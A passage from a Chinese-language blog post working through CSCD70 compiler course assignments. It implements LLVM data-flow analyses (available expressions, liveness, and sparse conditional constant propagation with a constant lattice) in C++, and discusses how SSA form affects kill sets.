<span class="keyword">if</span>(MeetOperands.<span class="built_in">empty</span>())</span><br><span class="line">    MeetOperands.<span class="built_in">push_back</span>(<span class="built_in">bc</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">meet</span>(MeetOperands);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成框架的工作之后,数据流分析只用完成TransferFunc的编写和遍历方向等的设置即可.</p><h2 id="可用表达式分析"><a href="#可用表达式分析" class="headerlink" title="可用表达式分析"></a>可用表达式分析</h2><p>其实有一个我一直在纠结的东西,就是在LLVM Pass上做可用表达式分析是否有意义.看下面的例子:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(<span class="type">int</span> A,<span class="type">int</span> B)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> C,D;</span><br><span class="line">    C = A+B;</span><br><span class="line">    A = A+<span class="number">1</span>; <span class="comment">//下面的IR分别是这条语句不存在和存在的情况.</span></span><br><span class="line">    D = A+B;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d%d"</span>,C,D);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define dso_local void @foo(i32 noundef %0, i32 noundef %1) #0 {</span><br><span class="line">  %3 = add nsw i32 %0, %1</span><br><span class="line">  %4 = add nsw i32 %0, %1</span><br><span class="line">  ret void</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">define dso_local void @foo(i32 noundef %0, i32 noundef %1) #0 {</span><br><span class="line">  %3 = add nsw i32 %0, %1</span><br><span class="line">  %4 = add nsw i32 %0, 1</span><br><span class="line">  %5 = add nsw i32 %4, %1</span><br><span class="line">  ret void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以发现原本的两次A+B,已经变成了两个不同的表达式add nsw i32 %0, %1和add nsw i32 %4, %1.<br>由于在Pass运行时,def-use和use-def链已经建立完成,况且IR也是SSA形式的,每一次对二元表达式的计算都是在定义一个新的变量,每一次计算使用的值都是其唯一定义的地方.并不存在去更改某个变量值的情况,也就不存在kill.如果有循环,可能会更改已经存在的变量的值,但稍微分析一下发现也没有意义. </p><p>不过在Meet多个控制流的DomainVal时,还是能起到可用表达式分析的作用.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312112029195.png"></p><p>对于kill,我没有想到一个理想的方法,参照了一些博客都是使用这样的方法:<br>通过本次指令的值被某个表达式使用,推断出本次指令是一次定义,kill掉该表达式.<br>但如前文所说,由于SSA,使用本次指令值的表达式一定在本次指令之前未曾出现,所以kill是无意义的.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(dfa::Expression expr : DomainVector)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(expr.LHS == &amp;Inst || expr.RHS == &amp;Inst)</span><br><span class="line">  {</span><br><span class="line">    <span class="type">int64_t</span> id;</span><br><span class="line">    <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>即使不是SSA形式,这样的方法也并不理想:<br>假设有这样一个基本块,使用该方法分析出来的对表达式A+B的OUT会是True,因为加1之后的A值不再被使用,也就没有kill的机会.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C = A + B</span><br><span class="line">A = A + <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>gen倒是没啥问题.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Inst.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">{</span><br><span class="line">  <span class="function">dfa::Expression <span class="title">expr</span><span class="params">(Inst.getOpcode(),Inst.getOperand(<span class="number">0</span>),Inst.getOperand(<span class="number">1</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int64_t</span> id;</span><br><span class="line">  <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!= <span class="number">-1</span>)</span><br><span class="line">  {</span><br><span class="line">    NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">true</span>;</span><br><span class="line">  }    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完整的TransferFunc</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AvailExprs::InitializeDomainFromInstruction</span><span class="params">(<span class="type">const</span> llvm::Instruction&amp; In)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>((DomainIdMap.<span class="built_in">emplace</span>(std::<span class="built_in">pair</span>(dfa::Expression::<span class="built_in">ExpressionFromIn</span>(In),DomainIdMap.<span class="built_in">size</span>()))).second)</span><br><span class="line">        {</span><br><span class="line">          DomainVector.<span class="built_in">push_back</span>(dfa::Expression::<span class="built_in">ExpressionFromIn</span>(In));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">AvailExprs::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  DomainVal_t NewODV = IDV;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(dfa::Expression expr : DomainVector)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(expr.LHS == &amp;Inst || expr.RHS == &amp;Inst)</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!=<span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">false</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">  {</span><br><span class="line">    <span class="function">dfa::Expression <span class="title">expr</span><span class="params">(Inst.getOpcode(),Inst.getOperand(<span class="number">0</span>),Inst.getOperand(<span class="number">1</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int64_t</span> id;</span><br><span class="line">    <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(expr))!= <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">true</span>;</span><br><span class="line">    }    </span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  ODV = NewODV;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312121417697.png"></p><h2 id="存活变量分析"><a href="#存活变量分析" class="headerlink" title="存活变量分析"></a>存活变量分析</h2><p>和可用表达式类似写出transferFunc就ok了.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LiveNess::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  DomainVal_t NewODV = IDV;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(Inst.<span class="built_in">hasNUsesOrMore</span>(<span class="number">1</span>))</span><br><span class="line">  {</span><br><span class="line">    <span class="type">int64_t</span> id;</span><br><span class="line">    <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> Iter  = Inst.<span class="built_in">op_begin</span>();Iter != Inst.<span class="built_in">op_end</span>(); ++Iter)</span><br><span class="line">  {</span><br><span class="line">    Value *V = *Iter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(V)||<span class="built_in">isa</span>&lt;Argument&gt;(V))</span><br><span class="line">    {</span><br><span class="line">      <span class="type">int64_t</span> id;</span><br><span class="line">      <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(V))!=<span class="number">-1</span>)</span><br><span class="line">      {</span><br><span class="line">        NewODV.<span class="built_in">at</span>(id).Value = <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  ODV = NewODV;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312121639563.png"></p><h2 id="稀疏条件常量传播"><a href="#稀疏条件常量传播" class="headerlink" title="稀疏条件常量传播"></a>稀疏条件常量传播</h2><h3 id="初始方案"><a href="#初始方案" class="headerlink" title="初始方案"></a>初始方案</h3><p>采用ForwardAnalysis,Domain为所有变量,用TValue为Bool,TMeetOp为Intersect.<br>TransferFunc如下:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SCCP::transferFunc</span><span class="params">(<span class="type">const</span> Instruction &amp;Inst, <span class="type">const</span> DomainVal_t &amp;IDV,</span></span></span><br><span class="line"><span class="params"><span class="function">                             DomainVal_t &amp;ODV)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">    DomainVal_t NewODV = IDV;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(Inst)||<span class="built_in">isa</span>&lt;Argument&gt;(Inst))</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int64_t</span> id1,id2;</span><br><span class="line">        <span class="type">bool</span> isconstant = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>((id1 = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!= <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">            {</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>(!(IDV[id2].Value==<span class="literal">true</span>))</span><br><span class="line">                  {</span><br><span class="line">                    NewODV[id1].Value = <span class="literal">false</span>;</span><br><span class="line">                    isconstant = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }    </span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(isconstant)</span><br><span class="line">                NewODV[id1].Value = <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    ODV = NewODV;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>用一个小的demo来验证一下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define i32 @Loop(i32 noundef %0) {</span><br><span class="line">  %2 = add nsw i32 1, 2</span><br><span class="line">  %3 = add nsw i32 %2, 5</span><br><span class="line">  %4 = add nsw i32 %3, %0</span><br><span class="line">  ret i32 %4</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312130009515.png"><br>可以看到没什么问题(其实代码里还应该特化一下对phi指令的分析).<br>再用官方给的测试用例:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312130039485.png"><br>发现没有一个常量,于是分析一下用来测试的IR代码:<br>可以看出,常量应该有%.12,%.01,%4但识别出这三个常量都需要先识别出label %7不可达,而这才是SCCP 稀疏条件常量传播的意义.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; <span class="type">int</span> <span class="title function_">Loop</span><span class="params">()</span> {</span><br><span class="line">;   <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>;</span><br><span class="line">;   <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">100</span>;) {</span><br><span class="line">;     <span class="keyword">if</span> (j &lt; <span class="number">20</span>) {</span><br><span class="line">;       j = i;</span><br><span class="line">;       k = k + <span class="number">1</span>;</span><br><span class="line">;     } <span class="keyword">else</span> {</span><br><span class="line">;       j = k;</span><br><span class="line">;       k = k + <span class="number">2</span>;</span><br><span class="line">;     }</span><br><span class="line">;   }</span><br><span class="line">;   <span class="keyword">return</span> j;</span><br><span class="line">; }</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; @todo(CSCD70) Please complete the CHECK directives.</span><br><span class="line">define i32 @Loop() {</span><br><span class="line">  br label %1</span><br><span class="line">1:                                                ; preds = %9, %0</span><br><span class="line">  %.01 = phi i32 [ 1, %0 ], [ %.12, %9 ] ;j</span><br><span class="line">  %.0 = phi i32 [ 0, %0 ], [ %.1, %9 ] ;k</span><br><span class="line">  %2 = icmp slt i32 %.0, 100 ;k&lt;100</span><br><span class="line">  br i1 %2, label %3, label %10</span><br><span class="line"></span><br><span class="line">3:                                                ; preds = %1</span><br><span class="line">  %4 = icmp slt i32 %.01, 20 ;j&lt;20</span><br><span class="line">  br i1 %4, label %5, label %7</span><br><span class="line"></span><br><span class="line">5:                                                ; preds = %3</span><br><span class="line">  %6 = add nsw i32 %.0, 1 ;k+1</span><br><span class="line">  br label %9</span><br><span class="line"></span><br><span class="line">7:                                                ; preds = %3</span><br><span class="line">  %8 = add nsw i32 %.0, 2 ;k+2</span><br><span class="line">  br label %9</span><br><span class="line"></span><br><span class="line">9:                                                ; preds = %7, %5</span><br><span class="line">  %.12 = phi i32 [ 1, %5 ], [ %.0, %7 ] ;j = 1 | j = k</span><br><span class="line">  %.1 = phi i32 [ %6, %5 ], [ %8, %7 ] ; new k</span><br><span class="line">  br label %1</span><br><span class="line"></span><br><span class="line">10:                                               ; preds = %1</span><br><span class="line">  ret i32 %.01</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="改进版"><a href="#改进版" class="headerlink" title="改进版"></a>改进版</h3><h4 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h4><p>在补了下数据流分析基础后,再来看这个问题.<br>单个变量可能值域的Lattice设计为这个样子(回想一下,之前使用的Bool的值域其实也是一个Lattice)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141242129.png"></p><p>Transferfunc像这样.有一点需要注意,之前所说的数据流分析中TranferFunc的单调性依赖于其gen集,kill集与输入无关这一性质,所以OUT与IN成正相关(相对于偏序关系来说).但这里的TransferFunc的gen集明显受到IN的影响,不过分析一下可以发现gen集同样与IN正相关,所以最终的OUT还是正相关的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141244522.png"></p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="Basic-Lattice"><a href="#Basic-Lattice" class="headerlink" title="Basic Lattice"></a>Basic Lattice</h5><p>单个变量值域的Lattice由Status和Value构成.之所以需要Value的域,是在常量传播到跳转条件的时候会用到. 至于Meet的设计就遵照上面理论所示(其实是遵照Meet的本意,即求最大下界),这个也很巧妙的符合只有当两个常量满足c1 == c2时,才有c1 Meet c2还是常量.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">ConstantStatus</span>{</span><br><span class="line">  UNDEF = <span class="number">2</span>,</span><br><span class="line">  CONST = <span class="number">1</span>,</span><br><span class="line">  NAC = <span class="number">0</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Constant</span>{</span><br><span class="line">  <span class="type">int64_t</span> Value;</span><br><span class="line">  <span class="keyword">enum</span> <span class="title class_">ConstantStatus</span> Status = NAC;</span><br><span class="line">  Constant <span class="keyword">operator</span>&amp;(<span class="type">const</span> Constant&amp; Other) <span class="type">const</span> {</span><br><span class="line">    Constant result;</span><br><span class="line">    result.Status = std::<span class="built_in">min</span>(Status,Other.Status);</span><br><span class="line">    <span class="keyword">if</span>(result.Status==CONST)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(Status == CONST &amp;&amp; Other.Status==CONST)</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(Value != Other.Value)</span><br><span class="line">        {</span><br><span class="line">          result.Status = NAC;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          result.Value = Value;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(Status == CONST)</span><br><span class="line">        result.Value = Value;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(Other.Status == CONST)</span><br><span class="line">        result.Value = Other.Value;        </span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> Constant <span class="title">top</span><span class="params">()</span> </span>{<span class="keyword">return</span> {.Status = UNDEF};}</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">bool</span><span class="params">()</span> <span class="type">const</span> </span>{<span class="keyword">return</span> Status==CONST;}</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="Kill集"><a href="#Kill集" class="headerlink" title="Kill集"></a>Kill集</h5><p>还是之前的思路,根据本次Value被其他指令使用来判断本次指令是一次defination,设置对应的Variable状态为NAC.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果该指令是一次定义,设置该指令代表的变量为NAC</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isa</span>&lt;Instruction&gt;(Inst)||<span class="built_in">isa</span>&lt;Argument&gt;(Inst))</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; V : DomainVector)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(<span class="type">const</span> Instruction* InofV = <span class="built_in">dyn_cast</span>&lt;Instruction&gt;(V.Var))</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : InofV-&gt;<span class="built_in">operands</span>())</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span>(operand.<span class="built_in">get</span>() == &amp;Inst)</span><br><span class="line">        {</span><br><span class="line">          <span class="type">int64_t</span> id;</span><br><span class="line">          <span class="keyword">if</span>((id = <span class="built_in">getDomainId</span>(dfa::Variable::<span class="built_in">VariableFromIn</span>(Inst)))!=<span class="number">-1</span>)</span><br><span class="line">          {</span><br><span class="line">            NewODV.<span class="built_in">at</span>(id).Status = dfa::NAC;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h5 id="Gen集"><a href="#Gen集" class="headerlink" title="Gen集"></a>Gen集</h5><p>照着这幅图实现就行.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141244522.png"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(IDV[id2].Status==dfa::NAC)</span><br><span class="line">      {</span><br><span class="line">        NewODV[id1].Status = dfa::NAC;</span><br><span class="line">        ifnac = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(IDV[id2].Status == dfa::UNDEF)</span><br><span class="line">      {</span><br><span class="line">        NewODV[id1].Status = dfa::UNDEF;</span><br><span class="line">        ifundef = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }    </span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(!ifnac)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(!ifundef)</span><br><span class="line">  {</span><br><span class="line">    NewODV[id1].Status = dfa::CONST;</span><br><span class="line">    NewODV[id1].Value = <span 